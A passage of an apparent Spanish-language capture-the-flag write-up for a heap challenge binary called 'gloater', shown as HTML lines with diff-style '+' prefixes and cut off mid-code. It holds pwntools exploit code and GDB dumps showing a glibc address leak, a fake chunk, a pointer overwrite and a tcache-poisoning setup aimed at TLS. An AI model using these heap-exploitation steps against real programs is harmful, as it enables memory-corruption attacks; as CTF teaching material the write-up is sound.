+<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Index for Super Taunt: '</span><span class="mtk1">, </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk9 mtki">index</span><span class="mtk1">).</span><span class="mtk8">encode</span><span class="mtk1">())</span>  
+<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Plague to accompany the super taunt: '</span><span class="mtk1">, </span><span class="mtk9 mtki">plague</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Plague entered: '</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">Registered'</span><span class="mtk1">, </span><span class="mtk9 mtki">drop</span><span class="mtk5">=</span><span class="mtk6">True</span><span class="mtk1">)</span>
+</code></pre></div><p>Pondremos el siguiente diseño en el <em>heap</em> para su uso posterior:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
+<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'asdf'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8">create_new_taunt</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'qwer'</span><span class="mtk1">, p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">181</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">20</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)) </span>  
+<span class="mtk1">    </span><span class="mtk8">create_new_taunt</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">118</span><span class="mtk1">) </span>
+<span class="mtk1">    </span><span class="mtk8">create_new_taunt</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'B'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">118</span><span class="mtk1">) </span>
+</code></pre></div><p>El tamaño de los <em>chunks</em> es bastante arbitrario. Empecé con <code>0x18</code>, pero luego necesitaba más tamaño para la primitiva de escritura arbitraria, así que simplemente sumé <code>0x100</code>, Lo cual fue lo más fácil.</p><p>Podemos iniciar el <em>exploit</em> y luego agregar GDB al proceso que se ejecuta en el contenedor Docker:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q -p <span class="code-dark-magenta">$(</span><span class="code-dark-green">pidof</span> <span class="mtku">gloater</span><span class="code-dark-magenta">)</span>
+Loading GEF...
+Attaching to process 327587
+Reading symbols from <span class="code-dark-green">target:/home/ctf/gloater</span>...
+(No debugging symbols found in <span class="code-dark-green">target:/home/ctf/gloater</span>)
+Reading symbols from <span class="code-dark-green">target:/lib/x86_64-linux-gnu/libc.so.6</span>...
+(No debugging symbols found in <span class="code-dark-green">target:/lib/x86_64-linux-gnu/libc.so.6</span>)
+Reading symbols from <span class="code-dark-green">target:/lib64/ld-linux-x86-64.so.2</span>...
+(No debugging symbols found in <span class="code-dark-green">target:/lib64/ld-linux-x86-64.so.2</span>)
+
+warning: Target and debugger are in different PID namespaces; thread lists and other data are likely unreliable.  Connect to gdbserver inside the container.  
+<span class="code-dark-blue">0x00007f443d19c1f2</span> in <span class="code-dark-yellow">read</span> () from <span class="code-dark-green">target:/lib/x86_64-linux-gnu/libc.so.6
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>vmmap heap
+[ Legend:  <span class="code-dark-red">Code</span> | <span class="code-dark-blue">Heap</span> | <span class="code-dark-magenta">Stack</span> | <span class="code-dark-green">Writable</span> | <span>ReadOnly</span> | <span class="code-grey">None</span> | <span class="mtku">RWX</span> ]
+<span class="code-blue">Start              End                Size               Offset             Perm Path</span>
+<span class="code-dark-blue">0x000056372a0c0000</span> <span class="code-dark-blue">0x000056372a0e1000</span> <span class="code-dark-blue">0x0000000000021000</span> <span class="code-dark-blue">0x0000000000000000</span> <span class="code-dark-blue">rw-</span> <span class="code-dark-blue">[heap]</span>  
+<span class="code-green">gef&gt; </span>x/300gx 0x000056372a0c0290
+<span class="code-dark-blue">0x56372a0c0290</span>: 0x0000000000000000      0x0000000000000031
+<span class="code-dark-blue">0x56372a0c02a0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56372a0c02b0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56372a0c02c0</span>: 0x000056372a0c02d0      0x0000000000000041
+<span class="code-dark-blue">0x56372a0c02d0</span>: 0x0000000000000000      0x0000000000000181
+<span class="code-dark-blue">0x56372a0c02e0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x56372a0c02f0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x56372a0c0300</span>: 0x0000000000000000      0x0000000000000031
+<span class="code-dark-blue">0x56372a0c0310</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56372a0c0320</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56372a0c0330</span>: 0x000056372a0c0340      0x0000000000000121
+<span class="code-dark-blue">0x56372a0c0340</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0350</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0360</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0370</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0380</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0390</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c03a0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c03b0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c03c0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c03d0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c03e0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c03f0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0400</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0410</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0420</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0430</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0440</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0450</span>: 0x4242424242424242      0x0000000000000031
+<span class="code-dark-blue">0x56372a0c0460</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56372a0c0470</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56372a0c0480</span>: 0x000056372a0c0490      0x0000000000000121
+<span class="code-dark-blue">0x56372a0c0490</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c04a0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c04b0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c04c0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c04d0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c04e0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c04f0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0500</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0510</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0520</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0530</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0540</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0550</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0560</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0570</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0580</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0590</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c05a0</span>: 0x4242424242424242      0x0000000000020a61
+...
+</code></pre></div><p>Como se puede ver, tenemos varios trozos:</p><ul><li>3 <em>chunks</em> para estructuras <code>taunt_t</code></li><li>2 <em>chunks</em> de tamaño <code>0x121</code></li><li>Un <em>chunk</em> de <code>0x41</code> (<code>0x56372a0c02d0</code>) que contiene dentro un <em>chunk</em> falso de <code>0x181</code> (<code>0x56372a0c02e0</code>)</li></ul><p>Ahora que tenemos algunas <em>taunts</em> establecidas, podemos usar <code>set_super_taunt</code> para fugar las direcciones de memoria:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>break *set_super_taunt+228
+Breakpoint 1 at <span class="code-dark-blue">0x5637292f48aa</span>
+<span class="code-green">gef&gt; </span>x/i *set_super_taunt+228
+   <span class="code-dark-blue">0x5637292f48aa</span> &lt;<span class="code-dark-yellow">set_super_taunt</span>+228&gt;:        <span class="code-dark-green">call<span class="code-white">   <span class="code-dark-blue">0x5637292f4080</span> &lt;<span class="code-dark-red">read@plt</span>&gt;  
+<span class="code-green">gef&gt; </span>continue
+Continuing.
+</code></pre></div><p>Tenemos estos valores en el <em>buffer</em> del <em>stack</em>, antes de la instrucción <code>read</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/40gx $rsi
+<span class="code-dark-blue">0x7ffcb59078f0</span>: 0x0000000000000000      0x0000000000000000  
+<span class="code-dark-blue">0x7ffcb5907900</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ffcb5907910</span>: 0x0000000000000000      0x0000000000009205
+<span class="code-dark-blue">0x7ffcb5907920</span>: 0x00005637292f3040      0x000000000000000b
+<span class="code-dark-blue">0x7ffcb5907930</span>: 0x00007ffcb59079a0      0x00007ffcb5907c59
+<span class="code-dark-blue">0x7ffcb5907940</span>: 0x00007f443d2865e0      0x00005637292f4a85
+<span class="code-dark-blue">0x7ffcb5907950</span>: 0x00007f443d27f2e8      0x00005637292f4a40
+<span class="code-dark-blue">0x7ffcb5907960</span>: 0x0000000000000000      0x00005637292f4100
+<span class="code-dark-blue">0x7ffcb5907970</span>: 0x00007ffcb5907a70      0x00007f443d112420
+<span class="code-dark-blue">0x7ffcb5907980</span>: 0x0000000000000000      0x00007f443d0b2083
+<span class="code-dark-blue">0x7ffcb5907990</span>: 0x0000000000000031      0x00007ffcb5907a78
+<span class="code-dark-blue">0x7ffcb59079a0</span>: 0x000000013d2767a0      0x00005637292f4288
+<span class="code-dark-blue">0x7ffcb59079b0</span>: 0x00005637292f4a40      0xc2a5b79a4e2fcd4f
+<span class="code-dark-blue">0x7ffcb59079c0</span>: 0x00005637292f4100      0x00007ffcb5907a70
+<span class="code-dark-blue">0x7ffcb59079d0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ffcb59079e0</span>: 0x3d5cdcbabd0fcd4f      0x3c2dcd8c0e41cd4f
+<span class="code-dark-blue">0x7ffcb59079f0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x7ffcb5907a00</span>: 0x0000000000000000      0x0000000000000001
+<span class="code-dark-blue">0x7ffcb5907a10</span>: 0x00007ffcb5907a78      0x00007ffcb5907a88
+<span class="code-dark-blue">0x7ffcb5907a20</span>: 0x00007f443d2b3190      0x0000000000000000
+</code></pre></div><p>Observe que en el <em>offset</em> 136 tenemos la dirección de <code>puts</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/gx $rsi+136
+<span class="code-dark-blue">0x7ffcb5907978</span>: 0x00007f443d112420
+<span class="code-green">gef&gt; </span>x 0x00007f443d112420
+<span class="code-dark-blue">0x7f443d112420</span> &lt;<span class="code-dark-yellow">puts</span>&gt;:  0x55415641fa1e0ff3  
+<span class="code-green">gef&gt; </span>continue
+Continuing.
+</code></pre></div><p>Además, la cantidad máxima de datos que podemos meter es 136, por lo que esto es perfecto:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk8">set_super_taunt</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">136</span><span class="mtk1">)[</span><span class="mtk6">136</span><span class="mtk1">:].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.puts</span>  
+<span class="mtk1">    </span><span class="mtk1">tls_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1f3540</span>
+<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
+</code></pre></div><p>Con esto, tenemos la dirección base de Glibc:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">[<span class="code-green">+</span>] Glibc base address: 0x7f443d08e000  
+</code></pre></div><p>Ahora, vamos a corromper <code>taunts[0]</code>, que está cercano a <code>user</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/s &user
+<span class="code-dark-blue">0x5637292f7100</span> &lt;<span class="code-dark-yellow">user</span>&gt;:  "asdf\n"
+<span class="code-green">gef&gt; </span>x/20gx &user
+<span class="code-dark-blue">0x5637292f7100</span> &lt;<span class="code-dark-yellow">user</span>&gt;:  0x0000000a66647361      0x0000000000000000
+<span class="code-dark-blue">0x5637292f7110</span> &lt;<span class="code-dark-yellow">super_taunt_plague</span>&gt;:    0x00007ffcb59078f0      0x0000000000000000  
+<span class="code-dark-blue">0x5637292f7120</span> &lt;<span class="code-dark-yellow">taunts</span>&gt;:        0x000056372a0c02a0      0x000056372a0c0310
+<span class="code-dark-blue">0x5637292f7130</span> &lt;<span class="code-dark-yellow">taunts</span>+16&gt;:     0x000056372a0c0460      0x0000000000000000
+<span class="code-dark-blue">0x5637292f7140</span> &lt;<span class="code-dark-yellow">taunts</span>+32&gt;:     0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5637292f7150</span> &lt;<span class="code-dark-yellow">taunts</span>+48&gt;:     0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5637292f7160</span> &lt;<span class="code-dark-yellow">super_taunt</span>&gt;:   0x000056372a0c02a0      0x0000000000000003
+<span class="code-dark-blue">0x5637292f7170</span> &lt;<span class="code-dark-yellow">libc_start</span>&gt;:    0x00007f443d0a01f0      0x00007f443d2761f0
+<span class="code-dark-blue">0x5637292f7180</span> &lt;<span class="code-dark-yellow">user_changed</span>&gt;:  0x0000000100000000      0x0000000000000000
+<span class="code-dark-blue">0x5637292f7190</span> &lt;<span class="code-dark-yellow">old_free_hook</span>&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-green">gef&gt; </span>continue
+Continuing.
+</code></pre></div><p>Modificaremos el último byte (<code>0xa0</code>) a <code>0xe0</code>, de manera que <code>taunt[0]</code> apunta a nuestro <em>chunk</em> falso de tamaño <code>0x181</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">update_current_user</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\xe0</span><span class="mtk4">'</span><span class="mtk1">)</span>  
+</code></pre></div><p>Después de esto, tenemos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/20gx &user
+<span class="code-dark-blue">0x5637292f7100</span> &lt;<span class="code-dark-yellow">user</span>&gt;:  0x4620524559414c50      0x20454854204d4f52
+<span class="code-dark-blue">0x5637292f7110</span> &lt;<span class="code-dark-yellow">super_taunt_plague</span>&gt;:    0x4c4e4f4954434146      0x4141414120535345  
+<span class="code-dark-blue">0x5637292f7120</span> &lt;<span class="code-dark-yellow">taunts</span>&gt;:        0x000056372a0c02e0      0x000056372a0c0310
+<span class="code-dark-blue">0x5637292f7130</span> &lt;<span class="code-dark-yellow">taunts</span>+16&gt;:     0x000056372a0c0460      0x0000000000000000
+<span class="code-dark-blue">0x5637292f7140</span> &lt;<span class="code-dark-yellow">taunts</span>+32&gt;:     0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5637292f7150</span> &lt;<span class="code-dark-yellow">taunts</span>+48&gt;:     0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5637292f7160</span> &lt;<span class="code-dark-yellow">super_taunt</span>&gt;:   0x000056372a0c02a0      0x0000000000000003
+<span class="code-dark-blue">0x5637292f7170</span> &lt;<span class="code-dark-yellow">libc_start</span>&gt;:    0x00007f443d0a01f0      0x00007f443d2761f0
+<span class="code-dark-blue">0x5637292f7180</span> &lt;<span class="code-dark-yellow">user_changed</span>&gt;:  0x0000000100000001      0x0000000000000000
+<span class="code-dark-blue">0x5637292f7190</span> &lt;<span class="code-dark-yellow">old_free_hook</span>&gt;: 0x0000000000000000      0x0000000000000000
+<span class="code-green">gef&gt; </span>x/20gx 0x000056372a0c02e0 - 0x10
+<span class="code-dark-blue">0x56372a0c02d0</span>: 0x0000000000000000      0x0000000000000181
+<span class="code-dark-blue">0x56372a0c02e0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x56372a0c02f0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x56372a0c0300</span>: 0x0000000000000000      0x0000000000000031
+<span class="code-dark-blue">0x56372a0c0310</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56372a0c0320</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56372a0c0330</span>: 0x000056372a0c0340      0x0000000000000121
+<span class="code-dark-blue">0x56372a0c0340</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0350</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0360</span>: 0x4242424242424242      0x4242424242424242
+</code></pre></div><p>A continuación, liberaremos este <em>chunk</em> falso, y también los <em>chunks</em> <code>2</code> y <code>1</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">remove_taunt</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)</span>  
+<span class="mtk1">    </span><span class="mtk8">remove_taunt</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">remove_taunt</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">)</span>
+</code></pre></div><p>El montón se queda así en este momento:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/300gx 0x000056372a0c0290
+<span class="code-dark-blue">0x56372a0c0290</span>: 0x0000000000000000      0x0000000000000031  
+<span class="code-dark-blue">0x56372a0c02a0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56372a0c02b0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56372a0c02c0</span>: 0x000056372a0c02d0      0x0000000000000041
+<span class="code-dark-blue">0x56372a0c02d0</span>: 0x0000000000000000      0x0000000000000181
+<span class="code-dark-blue">0x56372a0c02e0</span>: 0x0000000000000000      0x000056372a0c0010
+<span class="code-dark-blue">0x56372a0c02f0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x56372a0c0300</span>: 0x0000000000000000      0x0000000000000031
+<span class="code-dark-blue">0x56372a0c0310</span>: 0x000056372a0c0460      0x000056372a0c0010
+<span class="code-dark-blue">0x56372a0c0320</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56372a0c0330</span>: 0x000056372a0c0340      0x0000000000000121
+<span class="code-dark-blue">0x56372a0c0340</span>: 0x000056372a0c0490      0x000056372a0c0010
+<span class="code-dark-blue">0x56372a0c0350</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0360</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0370</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0380</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0390</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c03a0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c03b0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c03c0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c03d0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c03e0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c03f0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0400</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0410</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0420</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0430</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0440</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0450</span>: 0x4242424242424242      0x0000000000000031
+<span class="code-dark-blue">0x56372a0c0460</span>: 0x0000000000000000      0x000056372a0c0010
+<span class="code-dark-blue">0x56372a0c0470</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x56372a0c0480</span>: 0x000056372a0c0490      0x0000000000000121
+<span class="code-dark-blue">0x56372a0c0490</span>: 0x0000000000000000      0x000056372a0c0010
+<span class="code-dark-blue">0x56372a0c04a0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c04b0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c04c0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c04d0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c04e0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c04f0</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0500</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0510</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0520</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0530</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0540</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0550</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0560</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0570</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0580</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c0590</span>: 0x4242424242424242      0x4242424242424242
+<span class="code-dark-blue">0x56372a0c05a0</span>: 0x4242424242424242      0x0000000000020a61
+...
+</code></pre></div><p>En este punto, si asignamos un <em>chunk</em> de <code>0x181</code>, podremos solaparlo con el <em>chunk</em> de <code>0x121</code> que está debajo y modificar el puntero <code>fd</code> para realizar un simple ataque de Tcache <em>poisoning</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">create_new_taunt</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'C'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">, (</span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">40</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">31</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">40</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">121</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">tls_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">80</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">28</span><span class="mtk1">)).ljust(</span><span class="mtk7 mtki">0x</span><span class="mtk6">178</span><span class="mtk1">, 